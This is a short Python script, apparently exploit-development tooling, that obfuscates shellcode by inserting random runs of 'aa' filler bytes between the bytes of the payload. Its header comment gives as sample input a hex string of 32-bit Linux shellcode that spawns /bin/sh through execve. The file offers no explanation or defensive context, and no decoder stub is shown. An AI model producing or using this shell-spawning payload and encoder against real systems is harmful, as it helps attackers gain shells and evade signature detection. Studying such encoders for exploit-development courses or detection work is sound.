#!/usr/bin/python3
# -*- coding: utf-8 -*-
# run it with: 31c050682f2f7368682f62696e89e35089c25389e1b00bcd80

import sys
import random


if len(sys.argv) != 2:
        print("Enter opcode in hex")
        sys.exit(0)


opcode = sys.argv[1]
encoded = ""

b1 = bytearray.fromhex(opcode)


for x in b1:
        t = 'aa' * random.randint(1,5)
        encoded += '%02x' % x + t

print(encoded)
